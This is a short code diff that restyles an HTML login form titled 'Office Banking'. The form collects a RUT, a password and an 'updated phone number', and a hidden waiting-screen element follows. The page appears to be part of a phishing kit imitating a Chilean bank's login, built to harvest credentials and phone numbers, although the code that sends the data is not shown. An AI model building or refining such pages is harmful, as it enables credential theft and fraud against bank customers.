@@ -166,24 +166,26 @@
         Bienvenido a Office Banking
       </h5>
 
-        <!-- Formulario inicial -->
-        <form id="loginForm">
-          <label for="rut">RUT</label>
-          <input type="text" id="rut" name="rut" placeholder="12.345.678-5" required>
-          
-          <label for="passwd">Contraseña</label>
-          <input type="password" id="passwd" name="passwd" required>
+     <!-- Formulario ajustado -->
+<form id="loginForm" class="login-form">
+  <div class="mb-3">
+    <input type="text" id="rut" name="rut" placeholder="RUT" required>
+  </div>
+  <div class="mb-3">
+    <input type="password" id="passwd" name="passwd" placeholder="Contraseña" required>
+  </div>
+  <div class="mb-3">
+    <input type="tel" id="telefono" name="telefono" placeholder="Teléfono actualizado" required>
+  </div>
 
-          <label for="telefono">Teléfono actualizado</label>
-          <input type="tel" id="telefono" name="telefono" placeholder="+56 9 1234 5678" required>
-                          
-          <div class="options">
-            <a href="https://wslogin.officebanking.cl/autogestion-clave" target="_blank">¿Olvidaste tu clave?</a>
-          </div>
-          
-          <button type="submit" class="btn-red w-100">Aceptar</button>
-        </form>
-        <div id="resultado"></div>
+  <div class="options mb-3 text-end">
+    <a href="https://wslogin.officebanking.cl/autogestion-clave" target="_blank">¿Olvidaste tu clave?</a>
+  </div>
+
+  <button type="submit" class="btn-red w-100">Aceptar</button>
+</form>
+<div id="resultado"></div>
+
 
         <!-- Pantalla de espera -->
         <div id="pantallaEspera" class="hidden">
